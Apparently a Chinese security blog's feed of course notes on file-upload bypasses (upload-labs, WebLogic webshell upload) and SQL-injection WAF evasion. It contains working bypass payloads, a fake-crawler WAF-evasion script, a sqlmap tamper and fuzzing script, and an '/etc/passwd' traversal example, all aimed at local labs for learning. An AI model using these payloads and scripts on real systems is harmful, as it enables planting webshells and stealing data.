array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过 ::$DATA绕过在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过 1http://127.0.0.1/upload-labs/Pass-08/index.php 检测代码 1234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过 点空格点绕过通过. .来绕过 1http://127.0.0.1/upload-labs/Pass-09/index.php 检测代码 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 1234$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = trim($file_ext); //首尾去空这里只进行了一次该代码我们通过.php. .的方式进行绕过，第一次删除了最后面的点变成.php. 第二次去空变成了.php.的形式，所以还可以绕过。 绕过 双写绕过1http://127.0.0.1/upload-labs/Pass-10/index.php 将黑名单里的后缀名替换为空且只替换一次，因此可以用双写绕过，写为1.pphphp。 检测代码 12345678910111213141516$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 替换为空 if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $file_name)) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; .$file_name; $is_upload = true; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 绕过 白名单00截断00截断分为%00截断和0x00截断。当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。 利用条件：121.后缀检测，合格则进行上传路径拼接（白名单）2.拼接路径和文件名，组成文件上传路径 1截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态 利用（满足其中一个就行）121.路径拼接直接使用的 $file_name这个文件名，而不是 $file_ext和其他什么东西来拼成一个文件名字，这时文件名中还是包含截断字符的，路径拼好之后可以被截断成想要的.php。2.文件路径可控，比如我可以修改路径拼接的path时，比如抓到的包中存在path: uploads/，就可以直接把路径构造成uploads/xxx.php%00 %00截断12www.xxx.com/qq.jpgwww.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php %00截断 GET用法 当是GET接收情况的时候，直接用 %00 就可以了。 某些情况下，直接在文件名中加 %00 进行截断这是不对的，因为 %00 会以字符串的形式解析了。 如果没有做后缀名判断的情况下，那样会变成： 1www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php%00.jpg 也就是所谓的任意文件上传漏洞了，这又是另一个概念了。 %00截断 POST 用法 当是POST接收情况的时候，正确的用法应该是我们需要对 %00 做一个URL解码，也就是URL-decode； 为什么两者用法不同？ 这是因为 %00 截断在 GET 中被 url 解码之后是空字符。但是在 POST 中 %00 不会被 url 解码，所以只能通过 burpsuite 修改 hex 值为 00 （URL decode）进行截断。 注意： 有些时候数据包中必须含有上传文件后的目录情况才可以用。 例如：数据包中存在 path: uploads/，那么攻击者可以通过修改path的值来构造paylod: uploads/aa.php%00 像以下这个PHP文件上传检测代码，这个就需要有上传文件后的目录才能用。 12345678910111213$uploaded_name = $_FILES[ &#x27;file&#x27; ][ &#x27;name&#x27; ];$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); // 提取上传文件后缀$target_name = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; // 对上传文件进行重命名if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; )) &#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dir . $target_name); // 将临时文件移动到指定目录 $result = $dir . $target_name; echo &quot;Stored in: $result&quot;; &#125;else&#123; echo &quot;Invalid file&quot;;&#125; 为什么修改path才可以？ 因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名。 那么，攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/20190818.php 移动文件的时候会将文件保存为：uploads/aaa.php 从而达到Getshell效果。 例子 1http://127.0.0.1/upload-labs/Pass-11/index.php 检测代码 1234567891011121314151617181920$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &#x27;上传失败！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 绕过 0x00截断它们最终的结果都是一样的，都代表着chr(0)，即空字符，只不过使用的位置不同，0x00代表16进制的空字符00，需要在HEX中改为00，进行截断，而%00是URL解码之前的字符，它被解码成16进制ASCII码之后实际上也是0x00，所以它们最终都对应的是空字符。 1http://127.0.0.1/upload-labs/Pass-12/index.php 检测代码 1234567891011121314151617181920$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &quot;上传失败&quot;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 12$img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;这里获取路径用的是POST 绕过 方法1: 因为获取路径用的是POST，所有这里需要在修改一下编码 方法2: 通过0x00绕过 参考12https://blog.csdn.net/weixin_44840696/article/details/90581104https://www.fujieace.com/penetration-test/file-upload-00.html#google_vignette","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"文件上传","slug":"文件上传","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"20WEB漏洞--文件上传之基础及过滤方式","slug":"20WEB漏洞-文件上传之基础及过滤方式","date":"2021-09-21T02:30:34.000Z","updated":"2021-09-21T06:01:54.751Z","comments":true,"path":"2021/09/21/20WEB漏洞-文件上传之基础及过滤方式/","link":"","permalink":"https://al0nez.github.io/2021/09/21/20WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%87%E6%BB%A4%E6%96%B9%E5%BC%8F/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 知识汇总什么是文件上传漏洞？凡是存在文件上传的地方，都有可能存在文件上传漏洞。关键是看对方的防护代码写的是否安全，全面，一旦有一个地方可以绕过，就会造成文件上传漏洞。 原理文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。文件上传这个功能本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑不够安全，就会导致上传的文件被web容器解释执行，从而造成严重的后果 危害可以自定义，可以成为webshell，通过文件上传来上传网站后门，直接获取网站权限，属于高危漏洞。上传漏洞与SQL注入或 XSS相比 , 其风险更大 。可以获取数据库信息，可以对服务器提权，获取内网权限 判断对文件上传进行抓包，然后进行判断 注意地方对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期的测试。 在实际中的应用说明方法一​ 先直接传一个PHP，实战先传马。 ​ 实战先传一个正常的图片，看看有无返回存储地址。 ​ 如果能直接上传并解析，已离成功不远。 方法二​ 先传一个shell，然后进行修改。 ​ connect-Type:image/jpeg，看看是否可以进行绕过，如果不行，在上传内容添加GIF89a ​ 当然上传了还得看是否能够被解析为php，所有的上传都要考虑是否能够被解析。 方法三 上传一个abc.abcd，目的只是为了查看是否为白名单还是黑名单绕过。 ​ 黑名单限制一般为此文件类型不允许上传，考虑双写，大小写，空格，php2,php3,php4,php5,pht ​ phtml,等方式 我们继续上传一个/htaccess文件 ​ .htaccess文件能够设置服务器的解析文件的格式，匹配到dudu就已php的格式来解析，继而上传马 如果说.htaccess不能上传，接下来上传一个.user.ini，继而上传一个马 方法四​ 如果白名单限制上传 考虑00截断上传 文件包含漏洞+图片马 文件包含漏洞+二次渲染+图片马 方法五​ 上传的东西是否被服务器很快的删除或者移除，或者说上传成功，但是无法访问，就得考虑条件竞争。 ​ 以上均不行，考虑逻辑层面的思路 演示案例：常规文件上传地址的获取说明通过搜索带有upload关键字的网页 通过目录扫描工具进行扫描 不同格式下的文件类型后门测试不要妄想通过一个带有后门的图片后缀的文件来控制网站，关键是要看网站对脚本的解析是什么类型 什么格式的代码就用什么格式去执行，不可以乱用，否则是执行不了的。 配合解析漏洞下的文件类型后门测试nginx解析漏洞 我们上传一个正常的图片，图片中写如php代码，当我们去访问图片的时候，图片不会执行php代码。 当我们在后面加上1.php后，Nginx就会造成一个解析漏洞，php代码就会被执行。 本地文件上传漏洞靶场环境搭建测试 在客户端通过如下的javascript代码来检测用户提交的文件是否合法： 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;请选择要上传的文件!&quot;); return false; &#125; //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123; var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125;&#125; 如何判断是否是客户端js检测 1、选择一个.php后缀的文件，同时使用burp suite进行抓包 2、点击上传，可以看到还没有数据经过burp suite，浏览器就已经弹出警示框，说明数据还没有发送给服务器，程序就判断出来文件类型不对，因此就可以得出结论这个是通过客户端进行的本地文件检测 绕过方法 第一种 直接将js代码删除掉就可以了 第二种 前端上传一个合法的文件，通过抓包将报文截取，然后修改后缀上传 某 CMS 及 CVE 编号文件上传漏洞测试 可以看到图片上传上去了，但是抓包却抓不到，是因为上传操作是使用JS进行验证，在浏览器前端完成。点击保存才可以抓到包 我们将png修改为php上传 发现报错，而且没有返回路径，但是去后台看发现上传成功了。 又发现了他是fineCMS，去看一他有什么漏洞 找到刚才我们那个的上传路径 通过该路径成功执行代码 weblogic任意文件上传漏洞 账号是weblogic，密码通过 1docker-compose logs | grep password 可以查看 点击base_domain 点击高级 启用web测试页面 设置work home dir 1/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css 点击安全，进行添加 上传jsp木马 获取时间戳 11630587866052 然后访问http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可执行webshell： 1http://192.168.47.156:7001/ws_utc/css/config/keystore/1630587866052_3.jsp 执行成功","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"文件上传","slug":"文件上传","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"19WEB漏洞--SQL注入之深入WAF注入绕过","slug":"19WEB漏洞-SQL注入之深入WAF注入绕过","date":"2021-09-21T02:30:21.000Z","updated":"2021-09-21T06:02:08.024Z","comments":true,"path":"2021/09/21/19WEB漏洞-SQL注入之深入WAF注入绕过/","link":"","permalink":"https://al0nez.github.io/2021/09/21/19WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B7%B1%E5%85%A5WAF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言在攻防实战中，往往需要掌握一些特性，比如服务器、数据库、应用层、WAF层等，以便我们更灵活地去构造Payload，从而可以和各种WAF进行对抗，甚至绕过安全防御措施进行漏洞利用。 白名单方式一：IP 白名单 从网络层获取的 ip，这种一般伪造不来，如果是获取客户端的 IP，这样就可能存在伪造 IP 绕过的情 况。 测试方法： 1234567修改 http 的 header 来 bypass wafX-forwarded-for X-remote-IP X-originating-IP x-remote-addrX-Real-ip 方式二：静态资源 特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测 效率，不去检测这样一些静态文件名后缀的请求。 12http://10.9.9.201/sql.php?id=1 http://10.9.9.201/sql.php/1.js?id=1 备注：Aspx/php 只识别到前面的.aspx/.php 后面基本不识别 方式三：url 白名单 为了防止误拦，部分 waf 内置默认的白名单列表，如 admin/manager/system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。常见的 url 构造姿势： 123http://127.0.0.1/sql.php/admin/php?id=1http://127.0.0.1/sql.php?a=/manage/&amp;b=../etc/passwdhttp://127.0.0.1/../../../manage/../sql.asp?id=2 waf通过/manage/进行比较，只要url中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?1=manage/&amp;b=../etc/passwd绕过防御规则。 爬虫白名单原理百度通过爬虫的方式去收录网站，而不会让WAF拦截，我们就可以通过伪造百度爬虫的方式去绕过WAF。 各大搜索引擎的User-AgentUser-Agent1https://www.feiniaomy.com/post/429.html **百度 ** 服务器地址在北京 {city:”北京市”, province:”北京市”} 1Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html) 谷歌 服务器地址在芒廷维尤 {city:”芒廷维尤”, province:”加利福尼亚州”} 123Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) 伪造成百度爬虫脚本当我们不伪造百度爬虫时，我们去扫描网站，扫描到的结果都会被拦截，扫描结果都是错误的，而伪造以后就不会被拦截。 12345678910111213import jsonimport requestsurl=&#x27;http://192.168.0.103:8080/&#x27;head=&#123; &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0(compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)&#x27;&#125;for data in open(&#x27;PH1P.txt&#x27;): data=data.replace(&#x27;\\n&#x27;,&#x27;&#x27;) urls=url+data code=requests.get(urls).status_code print(urls+&#x27;|&#x27;+str(code)) FUZZ绕过脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/envpython&quot;&quot;&quot;Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)Seethefile&#x27;LICENSE&#x27;forcopyingpermission&quot;&quot;&quot;import osfrom lib.core.common import singleTimeWarnMessagefrom lib.core.enums import DBMSfrom lib.core.enums import PRIORITY__priority__=PRIORITY.HIGHESTdef dependencies(): singleTimeWarnMessage(&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;%(os.path.basename(__file__).split(&quot;.&quot;)[0],DBMS.MYSQL))def tamper(payload,**kwargs): #%23a%0aunion/*!44575select*/1,2,3 if payload: payload=payload.replace(&quot;union&quot;,&quot;%23a%0aunion&quot;) payload=payload.replace(&quot;select&quot;,&quot;/*!44575select*/&quot;) payload=payload.replace(&quot;%20&quot;,&quot;%23a%0a&quot;) payload=payload.replace(&quot;&quot;,&quot;%23a%0a&quot;) payload=payload.replace(&quot;database()&quot;,&quot;database%23a%0a()&quot;) return payloadimport requests,timeurl=&#x27;http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1&#x27;union=&#x27;union&#x27;select=&#x27;select&#x27;num=&#x27;1,2,3&#x27;a=&#123;&#x27;%0a&#x27;,&#x27;%23&#x27;&#125;aa=&#123;&#x27;x&#x27;&#125;aaa=&#123;&#x27;%0a&#x27;,&#x27;%23&#x27;&#125;b=&#x27;/*!&#x27;c=&#x27;*/&#x27;def bypass(): for xiaodi in a: for xiaodis in aa: for xiaodiss in aaa: for two in range(44500,44600): urls=url+xiaodi+xiaodis+xiaodiss+b+str(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiaodiss+num #urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xiaodiss+num try: result=requests.get(urls).text len_r=len(result) if (result.find(&#x27;safedog&#x27;)==-1): #print(&#x27;bypass url addreess：&#x27;+urls+&#x27;|&#x27;+str(len_r)) print(&#x27;bypass url addreess：&#x27;+urls+&#x27;|&#x27;+str(len_r)) if len_r==715: fp = open(&#x27;url.txt&#x27;,&#x27;a+&#x27;) fp.write(urls+&#x27;\\n&#x27;) fp.close() except Exception as err: print(&#x27;connecting error&#x27;) time.sleep(0.1)if__name__==&#x27;__main__&#x27;: print(&#x27;fuzz strat!&#x27;) bypass() SQLMAP绕过SQLMAP自带1https://blog.csdn.net/qq_34444097/article/details/82717357 自己写仿照SQLMAP自带的来写。 拦截直接通过SQLMAP跑，数据包的user-agent会显示sqlmap的标志 这样就会被WAF拦截 可以看到WAF开启了sqlmap工具拦截，就是通过识别user-agent。 更改user-agent sqlmap中可以通过–random-agent进行更改数据包中的User-Agent，来绕过WAF。 成功注入 可以看到我们成功注入 而且他是根据我们写的规则进行注入的 WAF开启流量防护 当WAF开启CC防护 我们再次注入，发现被拦截，原因是因为sqlmap注入太快了，被WAF拦截了 绕过方法 添加白名单User-Agent头部，像百度的、谷歌的 12sqlmap参数:--user-agent=&quot;xxxx&quot; 自定义User-Agent 代理池 添加延时参数 –delay参数 数据包中需要修改的sqlmap中没有时: 通过自己编写脚本二次开发。 比如说这里的user-agent是sqlmap中没有的，我们可以自己去修改，然后通过-r的方式在进行注入。 中转注入 sqlmap去注入本地的脚本地址 -&gt; 本地搭建脚本(请求数据包自定义编写) -&gt; 远程地址","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"18WEB漏洞--SQL注入之堆叠及WAF绕过注入","slug":"18WEB漏洞-SQL注入之堆叠及WAF绕过注入","date":"2021-09-21T02:30:05.000Z","updated":"2021-09-21T06:05:10.036Z","comments":true,"path":"2021/09/21/18WEB漏洞-SQL注入之堆叠及WAF绕过注入/","link":"","permalink":"https://al0nez.github.io/2021/09/21/18WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言在实际的渗透测试过程中，经常会碰到网站存在WAF的情况。网站存在WAF，意味着我们不能使用安全工具对网站进行测试，因为一旦触碰了WAF的规则，轻则丢弃报文，重则拉黑IP。所以，我们需要手动进行WAF的绕过，而绕过WAF前肯定需要对WAF的工作原理有一定的理解。 堆叠查询注入定义Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实 的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。 这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。 原理在mysql中；代表的是一个语句的结束，堆叠注入就是利用；使前一个语句结束，然后后面跟上我们自己的语句，就形成了堆叠注入。 局限性堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 例子1http://127.0.0.1/Less-38/?id=1 插入一个用户 1http://127.0.0.1/Less-38/?id=1&#x27;;insert into users values(100,&#x27;test&#x27;,&#x27;test&#x27;)--+ 基础知识1https://www.cnblogs.com/sunny11/p/14438269.html 大小写/关键字替换1234567891011id=1UnIoN/**/SeLeCT1,user()Hex() bin() 等价于 ascii()Sleep() 等价于 benchmark()Mid() substring() 等价于substr()@@user 等价于 User()@@Version 等价于 version() 各种编码1大小写，URL，hex，%0A等 注释使用1//----+#//+:%00/!/等 再次循环1union==uunionnion 等价替换1user()=@@user()and=&amp;or=|ascii=hex等 参数污染1?id=1&amp;id=2&amp;id=3 编码解码及加密解密1234s-&gt;%73-&gt;%25%37%33hex,unlcode,base64等 更改请求提交方式123GET POST COOKIE等POST-&gt;multipart/form-data WAF绕过-数据库特性Mysql技巧 （1）mysql注释符有三种：#、/…/、–…(注意–后面有一个空格，或者为–+) （2）空格符:[0x09,0x0a-0x0d,0x20,0xa0] （3）特殊符号：%a换行符 可结合注释符使用%23%0a，%2d%2d%0a。 （4）内联注释： 